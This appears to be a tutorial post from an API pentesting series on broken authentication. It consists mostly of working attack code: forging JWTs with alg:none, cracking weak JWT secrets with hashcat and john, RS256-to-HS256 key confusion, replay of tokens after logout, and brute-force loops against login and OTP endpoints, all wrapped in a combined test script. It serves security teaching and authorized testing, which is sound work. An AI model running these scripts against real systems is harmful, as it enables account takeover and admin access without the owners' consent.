# Broken API Authentication: JWT Attacks, Token Theft & Fixes

> **Series:** 30-Day API Pentesting  
> **Day:** 9 — Week 2: OWASP API Top 10  
> **Topic:** OWASP API2: Broken Authentication Attack Flows

---

## What is Broken Authentication?

APIs that fail to properly validate, verify, or manage authentication tokens. Attackers can forge tokens, steal them, replay them after logout, or brute force weak secrets — all leading to full account takeover.

---

## 01 · JWT Attack — alg:none Bypass

```python
import base64, json

# Step 1: Decode original token
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEwMDIsInJvbGUiOiJ1c2VyIn0.SIG"
header_b64, payload_b64, sig = token.split(".")
payload = json.loads(base64.b64decode(payload_b64 + "=="))

# Step 2: Modify payload
payload["role"] = "admin"
payload["userId"] = 1

# Step 3: Build forged token with alg:none
new_header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
forged = new_header.decode() + "." + new_payload.decode() + "."

print("Forged token:", forged)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
```

---

## 02 · JWT Weak Secret Cracking

```bash
# hashcat - fastest
hashcat -a 0 -m 16500 jwt_token.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# john
python3 jwt2john.py jwt_token.txt > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# Common weak secrets to try manually:
# secret, password, 123456, qwerty, admin, test
# jwt_secret, api_secret, app_secret, mysecret
# your-256-bit-secret, your-secret-key

# After cracking — forge admin token
python3 -c "
import jwt
payload = {'userId': 1, 'role': 'admin', 'exp': 9999999999}
token = jwt.encode(payload, 'password', algorithm='HS256')
print(token)
"
```

---

## 03 · RS256 → HS256 Algorithm Confusion

```python
import jwt, requests

# Step 1: Get public key from JWKS endpoint
resp = requests.get("https://target.com/.well-known/jwks.json")
# Or: https://target.com/jwks.json
# Or decode from existing RS256 token header

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Step 2: Sign token using HS256 with public key as secret
payload = {"userId": 1, "role": "admin", "exp": 9999999999}
forged = jwt.encode(payload, public_key, algorithm="HS256")

# Step 3: Send to server
# Server configured for RS256 but also accepts HS256
# It verifies with public key (which attacker knows) → accepts!
headers = {"Authorization": f"Bearer {forged}"}
resp = requests.get("https://target.com/api/admin/users", headers=headers)
print(resp.status_code, resp.text)
```

---

## 04 · Token Theft & Replay

```bash
# Test 1 — Token after logout
TOKEN=$(curl -s -X POST https://target.com/api/login \
  -d '{"email":"test@test.com","password":"Test123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Logout
curl -X POST https://target.com/api/logout \
  -H "Authorization: Bearer $TOKEN"

# Replay old token
curl https://target.com/api/profile \
  -H "Authorization: Bearer $TOKEN"
# Expected: 401. Bug if: 200 OK (token not revoked)

# Test 2 — Expired token accepted
# Decode JWT, change exp to past timestamp, re-encode
python3 -c "
import jwt, base64, json

token = 'YOUR_TOKEN'
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print('Current exp:', payload.get('exp'))
# Change exp to: 1000000000 (year 2001 - definitely expired)
"

# Test 3 — Token in URL (leaked to logs)
curl "https://target.com/api/export?token=BEARER_TOKEN"
# If accepts token in URL → leaks to server access logs
```

---

## 05 · Rate Limit Testing on Auth Endpoints

```bash
# Test login brute force protection
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@target.com\",\"password\":\"attempt$i\"}")
  echo "Attempt $i: $code"
  [ "$code" = "429" ] && echo "Rate limit at attempt $i" && break
done

# Test OTP brute force (000000 → 999999)
for otp in $(seq -w 0 9999); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/verify-otp \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"otp\":\"$otp\"}")
  if [ "$code" = "200" ]; then
    echo "OTP FOUND: $otp"
    break
  fi
done

# Endpoints to always test for rate limiting:
# POST /api/auth/login
# POST /api/auth/forgot-password
# POST /api/auth/verify-otp
# POST /api/auth/verify-email
# POST /api/auth/reset-password
```

---

## 06 · Complete Auth Test Checklist Script

```python
#!/usr/bin/env python3
import requests, base64, json, jwt as pyjwt

TARGET = "https://target.com"
TOKEN  = "YOUR_JWT_TOKEN"

def decode_jwt(token):
    parts = token.split(".")
    payload = json.loads(base64.b64decode(parts[1] + "=="))
    return payload

def test_alg_none(token):
    payload = decode_jwt(token)
    payload["role"] = "admin"
    h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    forged = h.decode() + "." + p.decode() + "."
    r = requests.get(f"{TARGET}/api/admin/users",
                     headers={"Authorization": f"Bearer {forged}"})
    print(f"alg:none test: {r.status_code}")
    if r.status_code == 200:
        print("VULNERABLE: alg:none bypass works!")

def test_expired(token):
    payload = decode_jwt(token)
    payload["exp"] = 1000000000  # Year 2001
    parts = token.split(".")
    new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    expired = parts[0] + "." + new_p.decode() + "." + parts[2]
    r = requests.get(f"{TARGET}/api/profile",
                     headers={"Authorization": f"Bearer {expired}"})
    print(f"Expired token test: {r.status_code}")
    if r.status_code == 200:
        print("VULNERABLE: expired token accepted!")

def test_rate_limit():
    for i in range(20):
        r = requests.post(f"{TARGET}/api/auth/login",
                          json={"email":"admin@test.com","password":f"wrong{i}"})
        if r.status_code == 429:
            print(f"Rate limit at attempt {i}")
            return
    print("VULNERABLE: no rate limiting on /login!")

test_alg_none(TOKEN)
test_expired(TOKEN)
test_rate_limit()
```

---

## Checklist

```
☐  Try alg:none JWT — change header to {alg:none} + remove signature
☐  Brute JWT secret — hashcat -m 16500 token.txt rockyou.txt
☐  Replay after logout — old token accepted = no revocation = bug
☐  Test expired tokens — change exp to past, does server accept?
☐  Rate limit on login — 100 requests, check for missing 429
☐  Check /jwks.json — public key exposed? Try RS256→HS256 confusion
☐  Token in URL params — does /api?token=X work? leaks to logs!
☐  OTP brute force — no rate limit on /verify-otp = enumerate codes
```

---

*30-Day API Pentesting Series — follow for more.*
